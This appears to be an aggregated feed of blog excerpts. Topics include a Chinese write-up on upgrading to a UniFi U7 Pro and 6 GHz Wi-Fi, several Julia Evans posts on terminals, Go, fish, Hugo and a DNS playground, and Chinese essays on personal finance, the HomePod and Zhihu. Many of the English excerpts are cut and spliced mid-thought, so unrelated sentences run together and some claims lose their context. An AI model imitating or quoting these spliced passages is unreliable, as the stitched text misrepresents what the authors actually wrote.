最近我买了新的电子书阅读器 Kobo Libra Colour，发现其在二楼的书房里很难连上 Wi-Fi；家属用 Nintendo Switch 打 Splatoon 3 联机经常掉线——我们终于决定买第二个 AP 了。

之前家里用的网络设备几乎都是 Ubiquiti / UniFi 的，现在还是打算继续买他们家的。看看 UniFi 又出了什么新货？

参考上文的对照表，很容易理解 UniFi 的产品线命名：AC 就是 Wi-Fi 5，而 U6 和 U7 分别对应 Wi-Fi 6 和 Wi-Fi 7。我家之前用的是 U6 Pro，支持 Wi-Fi 6 但不支持 Wi-Fi 6E。看到 U7 Pro 只比 U6 Pro 贵了一点点，于是就买了 U7 Pro——虽然家里并没有支持 Wi-Fi 7 的设备。购物车 (1)。

UniFi 的 AP 都是通过 PoE 供电。我之前是通过一个 PoE Adapter 给从普通交换机里出来的网线加上电，但现在有两个 AP 了，是不是干脆买个 PoE 交换机更好呢？再看看 UniFi 有啥 PoE 交换机？

算了一下功率，感觉最便宜 Lite 8 PoE 就够用了。购物车 (2)。

想要在把 AP 装到二楼，还要考虑网线的问题。我思索再三还是放弃了拆墙布线的计划，打算走明线。量了一下，在 Amazon 上买了个爆款 50 ft 网线。购物车 (3)。

开箱及配置

虽然从上文的商品页截图看起来各 AP 长得都差不多，但实际到手之后发现 U7 Pro 比 U6 Pro 厚了不少：

配置 UniFi 设备我已经驾轻就熟了——怎么 adoption failed 呢？后来发现是我的 controller 软件版本太老了。我用的是 linuxserver.io 维护 Docker 镜像。他们维护了两个不同的版本：

我使用的前者已经停止维护了，而迁移到后者需要重做 MongoDB，再导入/导出。

需要注意的是 6 GHz 并不是默认打开的，需要在设置里启用，并且把 SSID 的安全性改成 WPA3。

总之最终是跑起来了。现在网络设备柜里是这样的：

测速环节

最先成功连上 6 GHz Wi-Fi 的是我的 Google Pixel 7 手机：

图中我是用的外部测速网站，所以受到运营商带宽的限制。我家的带宽套餐的名义带宽是 940 Mbps，所以这样的速度已经算是跑满了。以前这样的速度只有在插了网线、有线上网的电脑上才能见到，这是我第一次在无线上网的手机上见到！

家属的 iPhone 15 Pro 也是支持 Wi-Fi 6E 的，但是却怎么也跑不出相应的速度。忘记网络之后重新输入一次密码之后总算跑出了应有的速度。我的猜测是因为 Wi-Fi 6E 需要 WPA3 加密所以要重新输入密码重新协商，而 Android 是每次连接的时候自动协商的，所以无需重新输入密码就可以自动连上。

iOS 不像 Android 那样直接是否使用 6 GHz 频率，但是如果支持 Wi-Fi 6E 的话，会在 SSID 设置里显示一个「Wi-Fi 6E Mode」选项。

下一步升级？

这是我第一次体验 Wi-Fi 6E 和 6 GHz Wi-Fi。在此之前，我体验过最快的无线上网速度也就 500 Mbps 左右，视周围无线干扰环境，大部分情况下实际值都比这个要低；而有线上网的话，1000 Mbps 是目前最常见的。因此，我之前一直喜欢有线上网多于无线上网；搬家之前，家里几乎所有能插网线的设备（电脑、电视机、打印机）全部都是通过有线上网，哪怕它们同时也具有无线上网功能。

这次的体验颠覆了我的认知：原来无线上网也能跑满 1000 Mbps 的带宽！Wi-Fi 6 和 Wi-Fi 6E 的技术细节几乎是一样的，后者主要是多了 6 GHz 支持，但我是真没想到 6 GHz 对实际带宽的影响如此之大。UniFi AP 可以调查周围的无线环境，其扫描结果显示，我家周围的邻居们已经把 2.4 GHz 和 5 GHz 的信道挤满了，而 6 GHz 信道里，一个 SSID 都没有！我家的 Wi-Fi 是 6 GHz 信道的唯一用户！Wi-Fi 标准的最大速率都是在无干扰的情况下的理论值，这也算是尽可能贴近理论值了吧。

可惜的是，由于设备限制，我现在并不能测出这 Wi-Fi 6E 在我家最大能跑到多大的带宽——虽然 U7 Pro 是 2.5 GbE (2500 Mbps) 的速率，但家里的交换机和路由器都是 GbE (1000 Mbps) 速率的。如果我在下单的时候买的是 $640 的 2.5 GbE 的 PoE 交换机呢？依然不够，因为测速不仅需要一个客户端，还需要一个服务器，我还得再有一个带 2.5 GbE 网卡的服务器才行。我的 home server 已经插了 NVMe 扩展卡之后已经没有空间插 2.5 GbE 的网卡了……

等 2.5 GbE 设备更普及一些我再考虑升级交换机吧。

这么快有什么用？

正如上文所说，我一直对有线上网有执念，能有线上网就尽量有线上网。搬家之后由于场地限制，很难实现全屋有线上网。现在无线上网的带宽达到千兆了，我对有线上网就没那么执念了。

实际应用的话，大概就是 Steam 购买新游戏到开始游戏之间的等待下载时间减半吧……

Wi-Fi 7

更新 ：买了 Google Pixel 9，补一张 Wi-Fi 7 的图：Screenshot_20240823-232530.png

由于上文所述原因，目前 Wi-Fi 7 和体验和 Wi-Fi 6E 的体验是没有差异的…
Source: wzyboy’s blog

**Reasons to use your shell's job control**
Hello! Today someone on Mastodon asked about job control ( fg , bg , Ctrl+z , wait , etc). I only use this in scripts though.

waits for all background processes to complete. My terminal totally ignores Ctrl+S so I guess I’m safe from that one though.

Some folks mentioned that they already set up a bunch of environment variables that they need to run various commands, so it’s easier to use job control to run multiple commands in the same terminal than to redo that work in another tab.

Probably the most obvious reason to use job control to manage multiple processes is “because you have to” – maybe you’re in single-user mode, or on a very restricted computer, or SSH’d into a machine that doesn’t have tmux or screen and you don’t want to create multiple SSH sessions.

Some people also said that they just don’t like using terminal tabs: for instance a few folks mentioned that they prefer to be able to see all of their terminals on the screen at the same time, so they’d rather have 4 terminals on the screen and then use job control if they need to run more than 4 programs.

I think my two main takeaways from thos post is I’ll probably try out job control a little more for:
Source: Julia Evans

**Entering text in the terminal is complicated**
The other day I asked what folks on Mastodon find confusing about working in the terminal, and one thing that stood out to me was “editing a command you already typed in”.

This really resonated with me: even though entering some text and editing it is a very “basic” task, it took me maybe 15 years of using the terminal every single day to get used to using Ctrl+A to go to the beginning of the line (or Ctrl+E for the end – I think I used Home / End instead).

So let’s talk about why entering text might be hard! I’ll also share a few tips that I wish I’d learned earlier.

A big part of what makes entering text in the terminal hard is the inconsistency between how different programs handle entering text. This includes:

most terminal text editors (nano, micro, vim, emacs, etc)

some shells (like fish), for example it seems like fish supports Ctrl+Z for undo when typing in a command. Does Ctrl+R do something else? This is probably some custom input library: it’ll probably act more or less like readline, and I can check the documentation if I really want to know how it works.

Being able to diagnose what’s going on like this makes the command line feel a more predictable and less chaotic.

There are lots more complications related to entering text that we didn’t talk about at all here, like:
Source: Julia Evans

**Go structs are copied on assignment (and other things about Go I'd missed)**
I’ve been writing Go pretty casually for years – the backends for all of my playgrounds (nginx, dns, memory, more DNS) are written in Go, but many of those projects are just a few hundred lines and I don’t come back to those codebases much.

I thought I more or less understood the basics of the language, but this week I’ve been writing a lot more Go than usual while working on some upgrades to Mess with DNS, and ran into a bug that revealed I was missing a very basic concept!

Then I posted about this on Mastodon and someone linked me to this very cool site (and book) called 100 Go Mistakes and How To Avoid Them by Teiva Harsanyi. Here’s some code on play.go.dev that does that.

This one isn’t a “mistake” exactly, but it’s been a source of confusion for me and it’s pretty simple so I’m glad to have it cleared up.

In Go you can declare methods in 2 different ways:

func (t Thing) Function() (a “value receiver”) func (t *Thing) Function() (a “pointer receiver”)

My understanding now is that basically:

If you want the method to mutate the struct t , you need a pointer receiver.

, you need a pointer receiver. There’s also Effective C++, Effective Java, and probably more.

other resources I’ve appreciated:
Source: Julia Evans

**Migrating Mess With DNS to use PowerDNS**
About 3 years ago, I announced Mess With DNS in this blog post, a playground where you can learn how DNS works by messing around and creating records.

I wasn’t very careful with the DNS implementation though (to quote the release blog post: “following the DNS RFCs? not exactly”), and people started reporting problems that eventually I decided that I wanted to fix.

Some of the problems people have reported were:

domain names with underscores weren’t allowed, even though they should be

If there was a CNAME record for a domain name, it allowed you to create other records for that domain name, even if it shouldn’t

you could create 2 different CNAME records for the same domain name, which shouldn’t be allowed

no support for the SVCB or HTTPS record types, which seemed a little complex to implement

no support for upgrading from UDP to TCP for big responses

And there are certainly more issues that nobody got around to reporting, for example that if you added an NS record for a subdomain to delegate it, Mess With DNS wouldn’t handle the delegation properly.

I wasn’t sure how to fix these problems for a long time – technically I could have started addressing them individually, but it felt like there were a million edge cases and I’d never get there.

But then one day I was chatting with someone else who was working on a DNS server and they said they were using PowerDNS: an open source DNS server with an HTTP API!

This seemed like an obvious solution to my problems – I could just swap out my own crappy DNS implementation for PowerDNS.

There were a couple of challenges I ran into when setting up PowerDNS that I’ll talk about here. I spent some time trying to tune Postgres’ memory usage by setting the max connections / work-mem / maintenance-work-mem and it helped a bit but didn’t solve the problem.

So for this refactor I decided to use SQLite instead, because the website doesn’t really get that much traffic. Using PowerDNS has fixed a lot of the DNS issues that folks have reported in the last few years and it feels great.

If you run into problems with the new Mess With DNS I’d love to hear about them here.
Source: Julia Evans

**Reasons I still love the fish shell**
I wrote about how much I love fish in this blog post from 2017 and, 7 years of using it every day later, I’ve found even more reasons to love it. That’ll complete to:

$ vim ~/.config/fish/config.fish

and I’m done. I think I like it because:

I really dislike configuring my shell (and honestly my dev environment in general), I want things to “just work” with the default settings fish’s defaults feel good to me I don’t spend that much time logged into random servers using other shells so there’s not too much context switching I liked its features so much that I was willing to relearn how to do a few “basic” shell things, like using parentheses (seq 1 10) to run a command instead of backticks or using set instead of export

Maybe you’re also a person who would like fish! I hope a few more of the people who fish is for can find it, because I spend so much of my time in the terminal and it’s made that time much more pleasant.
Source: Julia Evans

**Some Go web dev notes**
I spent a lot of time in the past couple of weeks working on a website in Go that may or may not ever see the light of day, but I learned a couple of things along the way I wanted to write down. If there are static files I can just embed them in the binary with embed.

there’s a built-in webserver that’s okay to use in production, so I don’t need to configure WSGI or whatever to get it to work. I imagine this is where a framework would help.
Source: Julia Evans

**Terminal colours are tricky**
Yesterday I was thinking about how long it took me to get a colorscheme in my terminal that I was mostly happy with (SO MANY YEARS), and it made me wonder what about terminal colours made it so hard.

So I asked people on Mastodon what problems they’ve run into with colours in the terminal, and I got a ton of interesting responses! Let’s talk about some of the problems and a few possible ways to fix them.

One of the top complaints was “blue on black is hard to read”. This feels reasonable to me – I use base16-vim in the terminal, so I guess I’m using that feature and it’s probably more important to me than ngrok (which I rarely use) behaving a bit weirdly.

This particular issue is a maybe obscure clash between ngrok and my colorschem, but I think this kind of clash is pretty common when a program sets an ANSI background color that the user has remapped for some reason.

A bunch of terminals (iTerm2, tabby, kitty’s text_fg_override_threshold, and folks tell me also Ghostty and Windows Terminal) have a “minimum contrast” feature that will automatically adjust colours to make sure they have enough contrast.

Here’s an example from iTerm. I’d much rather just have some reasonable defaults that I don’t have to change.

My one big takeaway from writing this was to turn on “minimum contrast” in my terminal, I think it’s going to fix most of the occasional accidental unreadable text issues I run into and I’m pretty excited about it.
Source: Julia Evans

**Some notes on upgrading Hugo**
Warning: this is a post about very boring yakshaving, probably only of interest to people who are trying to upgrade Hugo from a very old version to a new version. So maybe I won’t have to go through this again? We’ll see.

Also it turned out that the new Goldmark renderer does fix some problems I had (but didn’t know that I had) with smart quotes and how lists/blockquotes interact.

The hard part of this Markdown change was even figuring out what changed. I might have spent 10 hours on this upgrade, but I’ve probably spent 1000+ hours writing blog posts without thinking about Hugo at all so that seems like an extremely reasonable ratio.

I find it hard to be too mad about the backwards incompatible changes, most of them were quite a long time ago, Hugo does a great job of making their old releases available so you can use the old release if you want, and the most difficult one is removing support for the blackfriday Markdown renderer in favour of using something CommonMark-compliant which seems pretty reasonable to me even if it is a huge pain.

But it did take a long time and I don’t think I’d particularly recommend moving 700 blog posts to a new Markdown renderer unless you’re really in the mood for a lot of computer suffering for some reason.

The new renderer did fix a bunch of problems so I think overall it might be a good thing, even if I’ll have to remember to make 2 changes to how I write Markdown (4.1 and 4.3).

Also I’m still using Hugo 0.54 for https://wizardzines.com so maybe these notes will be useful to Future Me if I ever feel like upgrading Hugo for that site.

Hopefully I didn’t break too many things on the blog by doing this, let me know if you see anything broken!
Source: Julia Evans

**Using less memory to look up IP addresses in Mess With DNS**
I’ve been having problems for the last 3 years or so where Mess With DNS periodically runs out of memory and gets OOM killed.

This hasn’t been a big priority for me: usually it just goes down for a few minutes while it restarts, and it only happens once a day at most, so I’ve just been ignoring. I should add --alloc-space and --inuse-space to it.

I was storing my ip2asn entries like this:

type IPRange struct { StartIP net.IP EndIP net.IP Num int Name string Country string }

I had 3 ideas for ways to improve this:

There was a lot of repetition of Name and the Country , because a lot of IP ranges belong to the same ASN net.IP is an []byte under the hood, which felt like it involved an unnecessary pointer, was there a way to inline it into the struct? Maybe I didn’t need both the start IP and the end IP, often the ranges were consecutive so maybe I could rearrange things so that I only had the start IP

I figured I could store the ASN info in an array, and then just store the index into the array in my IPRange struct. Using less memory and a little more CPU seemed like a good tradeoff though.

it’s still using more memory than the raw text files do (46MB vs 37MB), I guess pointers take up space and that’s okay.

I’m honestly not sure if this will solve all my memory problems, probably not! But I had fun, I learned a few things about SQLite, I still don’t know what to think about tries, and it made me love binary search even more than I already did.
Source: Julia Evans

**ASCII control characters in my terminal**
Hello! I’ve been thinking about the terminal a lot and yesterday I got curious about all these “control codes”, like Ctrl-A , Ctrl-C , Ctrl-W , etc. When all of these control codes were originally defined, they weren’t being used for computers or terminals at all, they were used for the telegraph machine. I’ve used the terminal pretty successfully every day for the last 20 years without knowing literally any of this – I just knew what Ctrl-C , Ctrl-D , Ctrl-Z , Ctrl-R , Ctrl-L did in practice (plus maybe Ctrl-A , Ctrl-E and Ctrl-W ) and did not worry about the details for the most part, and that was almost always totally fine except when I was trying to use xterm.js.

But I had fun learning about it so maybe it’ll be interesting to you too.
Source: Julia Evans

**New microblog with TILs**
I added a new section to this site a couple weeks ago called TIL (“today I learned”).

One kind of thing I like to post on Mastodon/Bluesky is “hey, here’s a cool thing”, like the great SQLite repl litecli, or the fact that cross compiling in Go Just Works and it’s amazing, or cryptographic right answers, or this great diff tool. (you might think “julia, why not use bookmarks??” but I have been failing to use bookmarks for my whole life and I don’t see that changing ever, putting things in public is for whatever reason much easier for me)

So far it’s been working, often I can actually just make a quick post in 2 minutes which was the goal.

My page is inspired by Simon Willison’s great TIL blog, though my TIL posts are a lot shorter.

This came about because I spent a lot of time on Twitter, so I’ve been thinking about what I want to do about all of my tweets.

I keep reading the advice to “POSSE” (“post on your own site, syndicate elsewhere”), and while I find the idea appealing in principle, for me part of the appeal of social media is that it’s a little bit ephemeral. I might add a quick summary of any TIL posts from that week to the “blog posts from this week” mailing list.
Source: Julia Evans

**Importing a frontend Javascript library without a build system**
I like writing Javascript without a build system and for the millionth time yesterday I ran into a problem where I needed to figure out how to import a Javascript library in my code without using a build system, and it took FOREVER to figure out how to import it because the library’s setup instructions assume that you’re using a build system.

Luckily at this point I’ve mostly learned how to navigate this situation and either successfully use the library or decide it’s too difficult and switch to a different library, so here’s the guide I wish I had to importing Javascript libraries years ago.

I’m only going to talk about using Javacript libraries on the frontend, and only about how to use them in a no-build-system setup.

In this post I’m going to talk about:

the three main types of Javascript files a library might provide (ES Modules, the “classic” global variable kind, and CommonJS) how to figure out which types of files a Javascript library includes in its build ways to import each type of file in your code

There are 3 basic types of Javascript files a library can provide:

the “classic” type of file that defines a global variable. It’s definitely possible to write a script that automatically generates the importmaps using esbuild’s metafile but I haven’t done that and maybe there’s a better way.

I decided to set up importmaps yesterday to get github.com/jvns/bsky-oauth-example to work, so there’s some example code in that repo.

Also someone pointed me to Simon Willison’s download-esm, which will download an ES module and rewrite the imports to point to the JS files directly so that you don’t need importmaps. I’ve probably made some mistakes in this post and I’d love to know what they are – let me know on Bluesky or Mastodon!
Source: Julia Evans

**Why pipes sometimes get "stuck": buffering**
Here’s a niche terminal problem that has bothered me for years but that I never really understood until a few weeks ago. Let’s say you’ve run this command:

tail -f /some/log/file | grep thing1 | grep thing2

I asked people on Mastodon how they would solve this in practice and there were 5 basic approaches. It feels like it would be nice in theory but I can’t think of any program that does that so I imagine there are some downsides.

Some things I didn’t talk about in this post since these posts have been getting pretty long recently and seriously does anyone REALLY want to read 3000 words about buffering?
Source: Julia Evans

**"Rules" that terminal programs follow**
Recently I’ve been thinking about how everything that happens in the terminal is some combination of:

Your operating system’s job Your shell’s job Your terminal emulator’s job The job of whatever program you happen to be running (like top or vim or cat )

The first three (your operating system, shell, and terminal emulator) are all kind of known quantities – if you’re using bash in GNOME Terminal on Linux, you can more or less reason about how how all of those things interact, and some of their behaviour is standardized by POSIX.

But the fourth one (“whatever program you happen to be running”) feels like it could do ANYTHING. For example if I print out some text as #EEEEEE , it would be almost invisible on a white background, though it would look fine on a dark background.

But if you stick to the default 16 base colours, you have a much better chance that the user has configured those colours in their terminal emulator so that they work reasonably well with their background color. Hopefully writing down these “rules” explicitly will make learning some of this stuff a little bit faster for others.
Source: Julia Evans

**What's involved in getting a "modern" terminal setup?**
Hello! Recently I ran a terminal survey and I asked people what frustrated them. But each of these “not complicated” things really does add up and it’s especially tough if you need to keep your config in sync across several systems.

An extremely popular solution to getting a “modern” shell experience is oh-my-zsh. I just need to try stuff, figure out some kind of locally stable state that works for me, and accept that if I start using a new tool it might disrupt the system and I might need to rethink things.
Source: Julia Evans

**【免费试读】钱的焦虑、责任和安全感**
【免费试读】钱的焦虑、责任和安全感

到 2021 年 1 月为止，我记了 29 个月的明细账，一共 2443 笔支出，560 笔收入。大到单笔三万多元的费用结算，小到 1 分钱的优惠公交车票，依赖于电子支付的流行，没有一分钱错账。

记账是一个令人「上瘾」的事。通过记账，你建立起对钱的理性认知，获得对财务的掌控感，每个月底开始有结余，不再为下个月的信用卡账单发愁。渐渐地，你的收支流动越来越贴合预期，形成正向循环。有了正确的势能，存款账户里的钱也随时间越积越多，你开始研究投资、理财，为更远的人生做规划……

过去两年，在明细账、消费预算、月度现金流表、季度财务表的「督促」下，开源节流的落实变得无比高效。2020 年最后一个季度，我的收入相比两年前增长了 189.2%，支出减少了 67.5%，整个 2020 财年的储蓄率是 73.13%。

我最后一次出现「单月负现金流」是在 2019 年 3 月，因为有「去美国旅游」这笔大额支出。自那时至今，账本上每个月的 “Earning” 都是正的，且不断增长，月度结余的移动平均值很快由负转正，并直线飙升。

这个感觉非常好。毕竟对每一个当代社会人来说，掌控钱，是掌控生活的第一步。

-

这是几年前，刚走入社会的我，绝对想象不到的情况。

三年前，我在手里只有两万块存款的情况下裸辞。虽然后来又拿到了两个北京的工作 offer，但我最终还是选择，在没有任何收入的情况下，回老家，没钱大不了「啃老」。

当时我对未来的计划是，进个单位混份工资，再偶尔做点写稿的兼职，应该就能「活下去」了。我在心里定了一个「小目标」，如果每个月能赚到 xxxx 块钱，就应该能过得还不错了吧。

三年后，我的平均月收入已经是「小目标」的五倍。

我的确「活下来」了。但很可惜，五倍预期的收入并没有让我变快乐，更别说无忧无虑了。层层加码的工作，带来了严重的疲劳和焦虑，营造出碌碌无为的生活体感。

每个月，我都会提前计算，这个月需要赚多少钱，将支出控制在多少钱以内，才能让「平均月收入」、「平均月盈余」保持增长势头。

因为我是一个主业劳动收入只占 20% 的五分之四 freelancer。这意味着，我必须将收入目标分解为一个个具体的项目合约：xx 个小时的咨询、xx 篇媒体报道、xx 篇商务约稿……

回顾我过去两年的职业发展，其实总体来说是非常顺利、稳步向上走的。但每个月，账单上的数字都时时刻刻步步紧逼，每当工作的 flow 出现一些小的波动，一两周没活干时，焦虑就如潮水般袭来。

听起来非常 condescending，但有时候，福音和诅咒，就是一线之隔的事。特别是 2019 年末，父亲患病之后，家庭收入结构和角色的转换，让一切进一步加速、加剧。一切关于依赖父母的可能性的想象，都被打破，什么都必须靠自己了。

我开始以一种前所未有的态度，全身心投入地努力「赚钱」。因为它不再是单纯的自我实现与发展路径，更是一份沉重的责任。在每天的工作中，我越来越习惯被叫做「杰老师」，而不是小博士（学生时代的外号）。

在这之前，我是一个有商业意识，但很少「努力赚钱」的同学。这太不酷了，为了一点钱就低声下气、溜须拍马，触碰自己的原则，甚至放弃理想。

我每一次找工作，都是非常笃定的。我从来没做过「广投简历」这种事。从大学到现在，我一共只有过 10 次求职经历，拿了 8 个 offer，去做了其中 6 份工作。即使现在，我作为一个 contractor，也从不主动去找业务，都是甲方带着需求来找我。

-

在我的成长经历里，「钱」一直扮演着微妙的角色。

一方面，它是很多问题的开端，也是解决方案的基础。我那些最珍视的经历和回忆，每一次旅行，都建立在「费用」之上。

另一面，我也很早就认识到，钱不是万能的终极答案。我身边的朋友，资产量级是以「几位数」为单位分布，指数累加的。他们的喜悲，我看在眼里，与钱并没有太大关系。

钱能给你提供最基本的快乐、幸福和安全感，但这种满足机制的边际效益是锐减的。五倍于预期的收入，不代表五倍的快乐。

这是过去一年我反复问自己的问题：做了这么多财务管理的工作，教别人记账、做预算，提供投资建议。构建游戏化的机制，为毫无灵魂的工作找一个借口，为赚钱赋予意义，这一切就是为了驱动自己赚更多、花更少吗？

有一句话我说了多次：「美好的生活是靠双手创造的，但钱是大风刮来的。」

这才是「记账理财」的真正意义。你花一点时间，把钱的问题理清楚、搞明白，建立健康的风险意识、职业观念。做好计划，留好出口，其他时候才不用考虑钱的问题，无负担地去创造、享受生活。

你不再会嫉妒某个同事升职后月薪比你多了 5000 块钱；不再会被冲动消费支配，之后又陷入无聊的懊悔；不再会做出情绪主导的投资，被卷入承担不起的风险；不再会为钱挣扎，把恶意发泄在其他人身上……因为你有了自己的计划。

当然，意外总会发生，我们不可能完美掌控人生，但「计划」会给你留出更大的弹性、空间，让你可以专注于自己的成长和更高层次的自我实现。

而自我实现的力量，永远更强大。

-

本文节选自「LIFEHACKING101 DLC1：钱！钱！钱！」，完整的 DLC 内容是我在过去一年用哪些新方法进行记账、投资的总结，将于 3 月 1 日推送给付费读者。

此前购买了 LIFEHACKING101 的读者，可以免费获得所有 DLC 推送。

想阅读完整 DLC 的朋友，可以支付 99 元购买 LIFEHACKING101 Deluxe，获得全部文字和音频内容，以及未来全部 DLC 内容。

购买请转账 99 元至支付宝 & Paypal: jessechan42@gmail.com ，并备注你的邮箱地址，用于接收内容。
Source: 大破进击

**⭐️ To HomePod: the music DNA**
⭐️ To HomePod: the music DNA苹果正式签署了 HomePod 的死亡证明。这个动作很罕见，找一家媒体，郑重宣布「废除一条产品线」。苹果似乎想从一场噩梦中彻底醒来。HomePod 命途坎坷。自 2017 年夏天问世，到次年春天开售，这是苹果少有地，以「追随者」的身份，杀入一个产品品类。之前，无论是 Mac、iPod，还是 iPhone 和 Apple Watch，苹果从来只做产品风潮的引领者、革命者。HomePod 是苹果历史上最「不赚钱」的产品之一。发布之初，有媒体估算，HomePod 的物料成本高达 200 多美元，毛利率只有 40% 不到，不仅远低于 iPhone、Mac，还低于谷歌和亚马逊的音箱产品。即便如此，HomePod 还是太贵了。由亚马逊 Echo 锚定的智能音箱市场，价格基线是 99 美元。碰到优惠，大部分产品的价格甚至能做到 50 美元以下。偏离市场主流定位，是 HomePod 最根本的死因。所以苹果调整策略，推出了 99 美元，还没一根表带贵的 HomePod mini。宣布 HomePod 寿终正寝的同时，苹果强调：HomePod mini 销量喜人。-舆论对 HomePod 早有论断：好听，但不够智能。HomePod 的声音好，并不是因为有豪华的硬件配置，不在于发声单元的数量和功率（虽然它的配置的确很豪华），关键是背后的音频技术。这是苹果第一款搭载「计算音频」技术的产品。HomePod 能感知环境，实时对声音进行自适应调整。不管你把它以什么姿势，放在房间的什么位置，它都会与空间良好地「共振」。它还能对声音进行更精细的分频处理，三频分离度好到不像是「单体音箱」发出的声音。当时 Eddy Cue 在接受采访时提到过这个技术，之后苹果将它包装了一下，叫作「自适应均衡」（Adaptive EQ）。后来，这一系列音频技术被用在新款 MacBook Pro (T2 芯片控制)、iPad Pro 上，也被用在 AirPods Pro、AirPods Max 等耳机产品上。从这个角度来说，HomePod 其实很智能，它用来处理声音的智能技术甚至领先了时代。但这些技术领先是相对隐性的。功能上显性的落后，使 HomePod 遭受了不少批评：不支持 Spotify 等第三方服务，Siri 不够好、不够 cloud-based，基于 Wi-Fi 局域网的功能，稳定性、可用程度都很低……-HomePod 是一台用来「播内容」，而不是「播声音」的音箱。你可以用它听音乐、听播客、看电影，付出极低的代价，获得极致的声音体验。但你没法用它刷 TikTok、看 YouTube、打电话，用它取代「手机扬声器」。HomePod 甚至不鼓励你「频繁切歌」或「拖动电影进度条」，因为每一个类似的操作，都需要经过 Wi-Fi 传输，反馈不流畅，体验很差。这是一个有点矛盾的产品。一方面，它很便宜、很方便，随便放在房间的某个角落就可以用了。另一方面，它又只能播完整的唱片、专辑。HomePod 与那些零碎的，仅几秒钟长的「抖音神曲」绝缘。某种程度上，HomePod 将「认真听」这件事平民化了。你不需要一个经过设计的听音室，不需要专门的唱机、专门的音箱，就可以认真听一张专辑。这是苹果做产品的核心理念，用简单的方式做认真的事，也就是他们反复强调的，the music DNA。HomePod 发布之初，我曾与朋友讨论，「现在只要开口说一句话就可以听到音乐，这是不是过于方便，没仪式感了？」但实际上，HomePod 在「方便」和「认真」之间，找到了一个绝佳的平衡。可惜的是，更多人，甚至没有「认真听」的需求。-2018 年春天，我通过代购，第一时间买了一台 HomePod。至今三年，它成为了我房间不可或缺的一部分。从 3 岁开始，我就住在这个房间里，至今已 20 余年。我对它有诸多不满意，比如面积太小、地板和窗帘太难看……毕竟是老房子，很多设计都无法满足我今天的需要。但靠着这台 HomePod，我至少可以在房里认真听一张唱片。今年，我也要搬到新家去了。我在书房里规划了一个专门听音乐的角落，计划买一台黑胶唱机和一套有源音箱，还准备在客厅配置一套更好的影院系统。我能支配的房屋面积大了 10 倍，HomePod 不再不可或缺，它圆满完成了它的历史使命。HomePod 发售后的夏天，苹果推出了一支广告，由 Spike Jonze 执导。广告里，FKA twigs 随音乐起舞，空间也随舞姿和音符拓展开。这是我最喜欢的一条广告，没有之一。它汇聚了天马行空的想象，极具美感的艺术表达，同时又无比准确地切中了产品的深层特性。现在，一切已成历史。但我还是愿意感激它存在过、发生过，感谢苹果尝试过。
Source: 大破进击

**跟知乎有关的三个故事**
跟知乎有关的三个故事

一个略带喜感的事实是，成年之后，我坚持做过时间最长的一件事，是「玩知乎」。

2012 年 10 月 26 日， 一位高中学长，向我推荐了知乎，「感觉这个地方很适合你」。我注册了一个账号，10 天之后，是我的 18 岁生日。然后，一直用到今天。

前天，知乎在纽交所挂牌上市。回顾过去 9 年，我想分享与知乎有关的三个故事。

-

第一件事发生在 2013 年。

我在知乎看到一个问题，「为什么 iPad Air 的 A 是大写，而 iPad mini 的 m 却是小写？」。当年只是一个大一学生的我，基于在某本电脑杂志上看过的某篇文章的零散记忆，再加上自己的一些添油加醋，写了一篇回答。

我的核心理论是：如果 p 小写，iPad 就会变成 ipad，四个字母的底部就无法对齐，这样不美观。这个理论可能有 1% 的道理，剩余 99% 也不算大错特错，但这个观点本身就挺外行的。

我在这个答案上「倾注了一些心血」，认真对内容进行了「排版」，还去苹果官网截了图片，插在对应的论述下。然后这个答案收获了几十个赞同，在当时已经算很多了。

不久， 梁海老师写了另一个答案，无情反驳了我的观点，并针对我的内容发表评论，表示这种谁都能看懂的胡诌根本没什么意义。

梁海老师是字体排印领域的专业人士，当时的我并不知道这一点，十几岁的我也有自己的 ego，我在评论区相当嘴硬地回复了几句，出于对知乎这个平台的敬畏，我保持了一定的克制和体面。

但我还是认真读了他的答案，了解了字体排印的基本原则，并最终点下一个「赞同」。这可能是自青春期以来，我第一次「放下了无聊的自尊心」，折服于事实真相和专业的解读。

对未知领域的敬畏和求知心，推动我不断向前走。经由知乎、以及更广阔的互联网，我学到了更多东西，在自己的领域也有了一点「专业性」。

-

第二个要讲的，是我通过知乎找工作的故事。实际上，我的每一段工作经历，都和知乎或多或少有点关系。

2015 年春天，上大三的我，陷入了一场巨大的经济危机。各种挫败接二连三地扑过来。我对未来感到无比迷茫，走到了人生的至暗时刻。

那半年里，我 70% 的时间在打游戏，30% 的时间在玩知乎。我在知乎上写了几个关于游戏的回答，暑假临近结束的时候，有一家游戏媒体找到我，希望我能够为他们持续供稿，报酬不高，但是一个规律性的收入。对当时还在上学的我来说，无异于雪中送炭。

从那时起，我开始认真考虑把「做内容」变成一个职业选项。半年后，临近毕业，我又靠知乎上的创作经历，获得了一份爱否科技的全职 offer。这是我的第一份全职工作，一个巧合是，爱否科技最早也是创新工场孵化的项目，和知乎有些许渊源。

又过了半年，一个偶然的契机，我在知乎上得到了一个《离线》杂志的约稿，后来经过一系列传导，变成了我过去 4 年在做的，极客公园的这份工作。这一行其实是个很小的圈子，过程中我认识的不少朋友，都从各种角度和知乎有点联系。

知乎的核心创始团队是几个媒体人，早期靠邀请制，实现了在种子用户圈层的传播。他们也奠定了知乎最核心的产品气质：这不是一个靠某项核心技术或单一产品机制取胜的平台，它的基石建立在人与人之间交流、互动之上。

这种产品气质，加上主要基于文字的媒介属性，让知乎无法成为增长最快的那种公司，发展过程中也不可避免充满阵痛，每一次用户圈层向外延展，都会带来摩擦。

但它也具备某种前时代的「复杂性」。我们到知乎来，不只是「做一个自媒体账号」这么简单，更深刻的初衷是交流经验、分享观点、记录和展示自我。我在知乎上认识了很多朋友，找到过工作，所以我相信，知乎能耕耘出更丰富的长期价值。

-

第三个故事，关于知乎的商业价值。

2019 年夏天，老师参加极客公园的 Rebuild 活动，在台上提到，知乎最新一轮估值已经超过 30 亿美元。当时我和另一个朋友在台下听，朋友挺震惊，说知乎竟然值这么多钱。

那是下午最后一场对谈，结束后我们一起出来，在路上顺势聊到 B 站。当时正值 B 站上市一年，股价从一个高点有所回调，大概 15 美元不到，市值 40 多亿。我说，如果知乎 30 亿市值做实，你应该赶紧建仓 B 站。

作为一个投资标的，40 亿市值的知乎肯定不如 40 亿的 B 站（40 亿的 B 站你现在也买不到了）。后者身处一条更顺风的赛道，而且完成了一次核心权力交接，掌舵的 CEO，是一个专注商业运作多年，经验极为丰富的 70 后。

更何况，内容领域里，还有更多巨头，正用着更高级的手段，快速收割注意力。无论是刚上市的快手，还是招了新 CFO，IPO 箭在弦上的字节跳动。

